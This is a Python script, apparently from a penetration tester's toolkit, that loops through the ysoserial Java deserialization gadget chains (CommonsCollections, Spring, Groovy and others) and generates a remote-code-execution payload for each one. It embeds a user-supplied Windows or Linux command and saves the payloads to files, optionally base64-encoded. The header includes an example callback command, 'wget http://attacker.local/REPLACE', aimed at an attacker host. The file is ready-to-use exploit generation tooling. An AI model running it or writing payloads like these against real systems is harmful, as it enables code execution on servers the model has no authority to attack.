#!/usr/bin/env python3
#
# Script to work through each of the ysoserial payload options and attempt to
# create a base64 encoded payload. Builds from a user supplied command
# for windows and linux.
# Payloads are then placed into two files with user supplied postfix.
# One file is prefixed with "windows" and one with "linux"
#
# Expects:
#   win:        a windows command - requires one or both of win or lin
#   lin:        a linux command
#   b:          [optional] whether to base64 encode the output.
#               Default is to encode the output
#   v:          output full java stack trace to stdout on payload error
#   p:          output payload to stdout as well as file
#   name:       postfix for the file names
#   ysoserial:  path to ysoserial jar
#
# Note: Commands can include the string 'REPLACE' which will be replaced with
#       the name of the payload used
#       e.g. wget http://attacker.local/REPLACE
#
# Note: some payload options for ysoserial cannot take a command
#       these will error out. That is expected behaviour
#
# Original stolen from:
#   https://securitycafe.ro/2017/11/03/tricking-java-serialization-for-a-treat/
# TODO: deal with newlines in unencoded output
# TODO: parse the help from ysoserial to obtain payload list

import sys
import os
import subprocess
import base64
import argparse


payloads = ['BeanShell1', 'C3P0', 'Clojure', 'CommonsBeanutils1',
            'CommonsCollections1', 'CommonsCollections2',
            'CommonsCollections3', 'CommonsCollections4',
            'CommonsCollections5', 'CommonsCollections6',
            'CommonsCollections7', 'FileUpload1', 'Groovy1', 'Hibernate1',
            'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JRMPListener',
            'JavassistWeld1', 'Jdk7u21', 'Jython1', 'MozillaRhino1',
            'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1',
            'Spring2', 'URLDNS', 'Vaadin1', 'Wicket1']


def parse_arguments():
    '''
    Take the sys.argv and use argeparse to parse it out. Outputs usage
    Expects: sys.argv
    Returns: a namespace of arguments
    '''
    help_description = '''
                        Script Generates payloads from all possible ysoserial
                        payload options.\n
                        Uses a Windows and/or a Linux command to generate the
                        payload
                        '''
    parser = argparse.ArgumentParser(description=help_description)
    parser.add_argument('name', help='postfix applied to create filename')
    parser.add_argument('ysoserial', help='path to ysoserial jar')
    parser.add_argument('-w', '--win', help='Command for Windows OS',
                        type=str)
    parser.add_argument('-l', '--lin', help='Command for Linux OS',
                        type=str)
    parser.add_argument('-b', '--b64', help='Base64 encode payload',
                        action='store_true')
    parser.add_argument('-v', '--verbose',
                        help='Output Java trace to stdout on payload failure',
                        action='store_true')
    parser.add_argument('-p', '--payload',
                        help='Output full payload to stdout as well as file',
                        action='store_true')
    args = parser.parse_args()
    if (args.win is None and args.lin is None):
        print('At least one of --win or --lin is required')
        parser.print_help()
        sys.exit()
    if (not os.path.isfile(args.ysoserial)):
        print(f'{args.ysoserial} is not a valid file path')
        parser.print_help()
        sys.exit()
    return args


def generate(args):
    '''
    Iterate through each payload and generate a payload into "name" file
    Expects:
        args: argparse argument list
    Returns: none
    '''
    os_commands = {}
    if args.win is not None:
        os_commands['windows'] = args.win

    if args.lin is not None:
        os_commands['linux'] = args.lin

    for os_name, cmd in os_commands.items():
        for payload in payloads:
            # if using a payload which will work with an included string
            final = cmd.replace('REPLACE', payload)
            if args.verbose:
                print(f'Generating {payload} for {os_name}...')

            # It is expected some commands will fail. This is OK, just move on
            try:
                command = subprocess.run(['java', '-jar', args.ysoserial,
                                         payload, f'"{final}"'],
                                         capture_output=True)
                command.check_returncode()
                result = command.stdout
                if args.b64:
                    encoded = base64.b64encode(result)
                    if encoded != "":
                        open(f'{os_name}{args.name}',
                             'a').write(f'{encoded.decode("utf-8")}\n')
                else:
                    encoded = result
                    if encoded != "":
                        open(f'{os_name}{args.name}',
                             'ab').write(encoded + b'\n')
                if args.payload:
                    print(f'Result: {encoded}')
                if not args.verbose:
                    print(f'Payload {payload} for {os_name} complete')
            except subprocess.CalledProcessError as called_process_error:
                if args.verbose:
                    print(f'Generating {payload} for {os_name} failed:'
                          f'{called_process_error}\n'
                          f'{called_process_error.stderr.decode("utf-8")}\n')


def main():
    '''
    Main function, this script is not designed to be used as a module
    '''
    args = parse_arguments()
    generate(args)


if __name__ == '__main__':
    main()
